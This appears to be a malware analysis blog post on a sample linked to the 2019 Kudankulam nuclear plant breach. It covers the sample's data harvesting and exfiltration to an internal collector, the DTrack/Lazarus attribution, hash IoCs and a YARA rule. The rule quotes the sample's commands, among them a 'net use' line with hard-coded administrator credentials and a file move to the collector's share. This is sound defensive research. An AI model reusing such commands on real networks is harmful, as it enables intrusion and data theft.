The news was announced on\n[Monday October 28 by the Indian strategic infrastructure. In a press release on arstechnica,](https://arstechnica.com/information-technology/2019/10/indian-nuclear-power-company-confirms-north-korean-malware-attack/)\nNPCIL Associate Director A. K. Nema stated, “Identification of malware in NPCIL system is\ncorrect. The matter was conveyed by CERT-In [India’s national computer emergency\nresponse team] when it was noticed by them on September 4, 2019.”\n\n\n-----\n\nNPCIL Press Release\n\nOn October 28 at 2.37PM twitter user [@a_tweeter_user posted a Virus Total link claiming it](https://twitter.com/a_tweeter_user/status/1188811977851887616?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1188853620541775872&ref_url=https%3A%2F%2Farstechnica.com%2Finformation-technology%2F2019%2F10%2Findian-nuke-plants-network-reportedly-hit-by-malware-tied-to-n-korea%2F)\nwas the Malware employee during the KKNPP (Kudankulam Nuclear Power Plant) cyber\nattack. When I saw that link, I ‘ve been so fascinated about that cyber attack, that I decided\nto take a closer look to such a Malware in order to better understand what it is and who could\nbe behind such a dangerous cyber attack !\n\n## Technical Analysis\n\nHash bfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364\n\nThreat KKNPP Targeted Attack\n\n\n-----\n\nBrief\nDescription\n\n\nAccording to @a_tweeter_user that sample was used to target KKNPP the\nbiggest Nuclear Plant in India\n\n\nSsdeep 24576:4AzX0QVt4LjwctL0fn7J7eKj6a5VCxoq:bRccw47J7Fj99q\n\nThe analyzed file is a Windows PE seen in Virust Total on `2019-10-27 at 00:57:32. It looks`\nlike been compiled on `2019-07-29 13:36:26 for a 32 bit machine. Analyzing the sample`\nbehavior it looks like harvesting specific information on the target machine and it definitely is\ncomparable to a well defined targeted attack. Indeed the attacker knew the victim’s\nenvironment a priori. Many specific actions-and-modules have been found but we might sum\nup the observed behavior in few simple and consecutive actions. Once the sample is run it\nperforms 3 main actions: (i) Importing all the required functions and prepare all the needed\nmodules before implementing the real attack (for example logger, temporary files and static\nfunctions) (ii) find local information and (iii) copy information to a central node. The following\nimage shows the three main functions inside the WinMain.\n\nMain\n\nFunctions\nOne of the most interesting function is the `sub_DE33BO where the sample starts to collect`\ninformation regarding: (i) local **IP** **Addresses, (ii) Task** **listing, (iii) information** **on** **routing**\n**and** **interfaces. Everything is logged into a temporary file located in**\n```\n%APPDATA%/Temp/temp/ .\n\n```\n\n-----\n\nNetwork Information Harvesting\nNetwork information is not the only thing the sample is looking for. Indeed it looks for many\nsoftware assuming they are located into different system volumes such as for example:\n```\ne:\\html\\PowerShellCorpus\\Github\\ . The following image shows some of the collected\n\n```\nfiles assumed to be in different volumes (C and E).\n\nThe Sample looks for software in specific system paths\nIt is definitely interesting to see that the attacker assumes the existence of a C and E drives.\nIt looks like the attacker already knew what to search on the victim machine. In addition to\nsuch information the sample looks for `moz_places file and by loading a SQLite driver it`\nbegins a querying routine to get `urls and` `rootpage . The Malware has modification`\nmodules which could be used to modifies entry points into moz_places but I did not see any\nrunning usage on it. Then every collected information is saved into a folder tree that looks\nlike the following one\n\n\n-----\n\nThe sample saves information on a hidden folder\n\ntree\n192.168.56.2 folder holds the found information regarding harvested software on the victim\nmachine having as IP address the one used as folder name. Everything is well organized\nand the output of each file is human readable and well curated as well. It looks like the\n**sample could be weaponized with more modules holding different behaviors. Once the**\nharvesting process ends its life-cycle, the analyzed sample compresses the entire folder,\nplaces it on `PPDATA%/Temp/~77FDD3EAMT.tmp and sends it to` `10.38.1.35 known as`\n```\ncontroller5kk . Then it copies that file from the C: drive on the target machine to a more\n\n```\nhidden directory such as: `Windows\\Temp\\MpLogs, by assuming that directory is defined on`\nthe target machine. Finally it deletes the just moved file ( ~77FDD3EAMT.tmp ) from the\nshared folder `C:\\ (where it was placed before being copied). At that stage it looks like the`\nattacker owns the destination machine ( 10.38.1.35 ) since acting as a central collector for\nevery infected machine. The following image shows the code section including customized\nfunctions, address and credentials of the power implant.\n\n\n-----\n\nLateral Movement Crafted into Windows PE\nI believe it is interesting for every analyst to read IP addresses and user credentials directly\nhard-coded into the sample, since if those information are correct (as you might assume\nonce you read the press release note) It is not hard to believe that we are analyzing a\nsample belonging to a targeted attack, crafted for harvesting information and eventually to\ncontrol victim machines. The analyzed sample is quite modular and it can be\n**weaponized with many capabilities for example: external communication over TLS,**\n**Command and Control and RAT, but on my runs the sample never showed such**\n**additional behaviors.**\n\n## Attribution\n\nAttribution is always a very hard and challenging section in Malware Analyses. The analyzed\n[sample is very close to what Kaspersky defined as DTrack in HERE. Two main strong](https://securelist.com/my-name-is-dtrack/93338/)\nsimilarities to DTrack took me to believe we are facing an initial information gathering stage\npowered by a customized DTrack Malware. Two of the main similarities are the following\nones:\n\n**Initial** **Sample** **in-Memory Manipulation** **stage between OE (Original Entry Point) and**\nWinMain function.\n**String** **Manipulation** **function looking for “CCS_”.**\n\nThe following image shows the strong similarities between the string preparation function\navailable on address 0x8BB041. On the left side the analyzed sample while on the right side\n[a screen coming from Kaspersky analysis ( published on securelist)](https://securelist.com/my-name-is-dtrack/93338/)\n\n\n-----\n\nSimilarities with DTrack\nBoth samples look for “CCS_” string and manipulate it in the same way. However DTrack is\nhistorically related to Lazarus / APT38 group, a threat organization also known as Hidden\n[Cobra and attributed (by FireEye) to North-Corea state which actually is used to target -at](https://content.fireeye.com/apt/rpt-apt38)\nleast in the past months- financial institutions. The group has been active since at least 2009\nand was reportedly responsible for the November 2014 destructive wiper attack against Sony\nPictures Entertainment as part of a campaign named Operation Blockbuster by Novetta\n(from MITRE). APT38 is not well-known for attacking critical infrastructures, moreover\nDTrack is a well-known Malware distributed over ATM, in order to attack financial institutions\nall over the world. However the attack phase is actually aligned with Lazarus modus[operandi as reported in the FireEye document (HERE) Figure 5 page 16.](https://content.fireeye.com/apt/rpt-apt38)\n\nAs a matter of fact, Lazarus is used to initiate a separate phase of Information Gathering\nbefore the real attack takes place. If you focus on target, it’s known that Lazarous attacks\nfinancial institution but they performed destruction attacks in the past years (such as wiping\nSony Entertainment) as well as gov-based attacks (such as the Komisja Nadzoru\nFinansowego, or KNF attack). At that point every reader would ask: “Is it APT38 moving their\ntargets to critical infrastructure or are we experiencing a well crafted false flag ? ” Hard to\nanswer with scientific precision, in my personal opinion it’s going to be an open question for\nat least few time, but if I had to bet on, I would probably bet on Lazarus that they are adding\nto their attack plan more strategic targets like Nuclear Plants.\n\n## IoC\n\n\n-----\n\nHash:\n\nbfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364\n(verified)\n3cc9d9a12f3b884582e5c4daf7d83c4a510172a836de90b87439388e3cde3682\n(not directly verified)\n93a01fbbdd63943c151679d037d32b1d82a55d66c6cb93c40ff63f2b770e5ca9\n(not directly verified)\na0664ac662802905329ec6ab3b3ae843f191e6555b707f305f8f5a0599ca3f68\n(not directly verified)\nc5c1ca4382f397481174914b1931e851a9c61f029e6b3eb8a65c9e92ddf7aa4c\n(not directly verified)\n\n## Yara Rule\n\n\n-----\n\n```\nimport pe \nrule lazarus_dtrack {\n  meta:\n   description = \"lazarus - dtrack on nuclear implant KKNPP\"\n   date = \"2019-11-02\"\n   hash1 = \"bfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364\"\n  strings:\n   $x1 = \"move /y %s \\\\\\\\10.38.1.35\\\\C$\\\\Windows\\\\Temp\\\\MpLogs\\\\\" fullword ascii\n   $x2 = \"Execute_%s.log\" fullword ascii\n   $x3 = \"%s\\\\%s\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword ascii\n   $s4 = \"CCS_/c ping -n 3 127.0.0.1 >NUL & echo EEEE > \\\"%s\\\"\" fullword ascii\n   $s5 = \"%s\\\\%s\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History\"\nfullword ascii\n   $s6 = \"Usage: .system COMMAND\" fullword ascii\n   $s7 = \"Usage: .dump ?--preserve-rowids? ?--newlines? ?LIKE-PATTERN?\" fullword\nascii\n   $s8 = \"CCS_shell32.dll\" fullword ascii\n   $s9 = \"%s:%d: expected %d columns but found %d - filling the rest with NULL\"\nfullword ascii\n   $s10 = \"%s:%d: expected %d columns but found %d - extras ignored\" fullword\nascii\n   $s11 = \"%s\\\\%s\\\\AppData\\\\Application Data\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword\nascii\n   $s12 = \"net use \\\\\\\\10.38.1.35\\\\C$ su.controller5kk /user:KKNPP\\\\administrator\"\nfullword ascii\n   $s13 = \"VALUES(0,'memo','Missing SELFTEST table - default checks only',''),  \n(1,'run','PRAGMA integrity_check','ok')\" fullword ascii\n   $s14 = \"CCS_Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/54.0.2840.99 Safari/537.36\" fullword ascii\n   $s15 = \"Usage %s sub-command ?switches...?\" fullword ascii\n   $s16 = \"Usage: .log FILENAME\" fullword ascii\n   $s17 = \"Content-Disposition: form-data; name=\\\"result\\\"; filename=\\\"%s.bmp\\\"\"\nfullword ascii\n   $s18 = \"%z%sSELECT pti.name FROM \\\"%w\\\".sqlite_master AS sm JOIN\npragma_table_info(sm.name,%Q) AS pti WHERE sm.type='table'\" fullword ascii\n   $s19 = \"CCS_kernel32.dll\" fullword ascii\n   $s20 = \"CCS_Advapi32.dll\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 2000KB and\n   ( pe.imphash() == \"75171549224b4292974d6ee3cf397db8\" or ( 1 of ($x*) or 4 of\nthem ) )\n}\n\n```\n\n-----",
